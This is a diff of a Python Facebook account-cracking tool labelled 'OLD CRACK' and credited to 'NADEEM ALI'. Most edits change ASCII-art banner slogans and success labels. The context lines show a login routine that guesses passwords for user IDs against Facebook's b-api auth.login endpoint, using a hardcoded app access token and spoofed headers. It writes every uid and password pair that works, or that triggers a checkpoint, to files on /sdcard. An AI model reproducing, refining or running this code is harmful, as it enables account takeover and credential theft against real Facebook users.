@@ -56,13 +56,13 @@ logo = (f"""
 888   Y8888  d8888888888 888  .d88P  888   888   "   888      Y88b  d88P 
 888    Y888 d88P     888 8888888P" 8888888 888       888       "Y8888P88
                                                                                     
-\x1b[1;92m═━═━═━═━═━━═━═━══━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━═━═━═━━═━═━══━═━═━═══━═━━═━═━══━═━═━═━═━═━═[[<PARDHAN ISHU KI JWAN>]]━═━═━══━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━═━━═━═━══━═━═━══━═━═━━═━═━══━══━═━═━━═━═━══━═━═━══━═━━═━════━━═━═━══━═━══━═━═━══━═━═━
+\x1b[1;92m═━═━═━═━═━━═━═━══━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━═━═━═━━═━═━══━═━═━═══━═━━═━═━══━═━═━═━═━═━═[[<SAB KEHNE KI BAAT HAI YAHA KOI NA HOTA APNA PARDHAN>]]━═━═━══━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━═━━═━═━══━═━═━══━═━═━━═━═━══━══━═━═━━═━═━══━═━═━══━═━━═━════━━═━═━══━═━══━═━═━══━═━═━
 \033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92   NADEEM ALI                              SYSTEMS MAIN 🌺
-[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m PARDHAN KIING                           RAHOGE   TO
+[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m PARDHAN KIING                                RAHOGE   TO
 [\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD CRACK  DONE                      FAIDE MAIN BHI RAHOGE
 [\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92FREE TOOL 
 [\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32V.6\033[1;35m]                                  BROKEN NADEEM INSIDE
-\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━═━═━━═━═[[<ISHU PARDHAN KII JWAN>]]━══━═━═━═━═━══━━═━══━═━━═━═━═━══━═━━══━═━═━══━═━═━━═━═━═━━═━═━══━═━═━══━═━═━━═━═━═══━━═━═━══━═━═━═══━━═━═━══━═══━═━═━═━═━═""")
+\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━━═━═━══━═━═━══━═━═━═━━═━═[[<MAIN RIISTE MAHA TAK NIBHAYA HAI YAHA LOG MAR JATE HAI>]]━══━═━═━═━═━══━━═━══━═━━═━═━═━══━═━━══━═━═━══━═━═━━═━═━═━━═━═━══━═━═━══━═━═━━═━═━═══━━═━═━══━═━═━═══━━═━═━══━═══━═━═━═━═━═""")
 #----------------------------[MAIN/DEF]-----------------------------------#
 def main():
     user=[]
@@ -117,12 +117,12 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
             if "session_key" in rp:
-                print(f"\r\r{G}NADEEM OKY  {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}[-NADEEM OKY-]  {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/NADEEM-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r{G}NADEEM OK  {A}➤ {G}{uid} {A}•{G} {pw}")
+                print(f"\r\r{G}[-NADEEM OKY-]  {A}➤ {G}{uid} {A}•{G} {pw}")
                 open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
